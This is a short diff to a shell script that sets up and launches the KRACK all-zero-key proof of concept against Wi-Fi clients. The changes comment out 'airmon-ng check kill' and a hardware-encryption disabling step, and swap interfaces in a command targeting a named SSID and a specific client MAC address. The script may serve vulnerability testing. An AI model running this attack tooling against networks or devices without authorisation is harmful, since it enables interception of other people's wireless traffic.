@@ -6,7 +6,7 @@ echo "Setting up dependencies..."
 
 #Disable network, but ensure the script can still use wifi
 sudo nmcli radio wifi off
-sudo airmon-ng check kill
+#sudo airmon-ng check kill
 sudo rfkill unblock wifi
 
 
@@ -38,7 +38,7 @@ then
 fi
 
 # TODO should only be run the first time!
-./findVulnerable/krackattack/disable-hwcrypto.sh
+#./findVulnerable/krackattack/disable-hwcrypto.sh
 
 # Disable hardware encryption, as bugs on some Wi-Fi network interface cards could interfere with the script used to check whether a client is vulnerable
 
@@ -62,5 +62,5 @@ fi
 ## TODO To check: the nohwcript/.. param has been set.
 
 # TODO Look for key reinstallations in the 4-way handshake
-./krackattacks-poc-zerokey/krackattack/krack-all-zero-tk.py wlan0 wlan1 Brennbakkvegen194 --target 54:27:58:63:14:aa
+./krackattacks-poc-zerokey/krackattack/krack-all-zero-tk.py wlan1 wlan0 Brennbakkvegen194 --target 54:27:58:63:14:aa
 
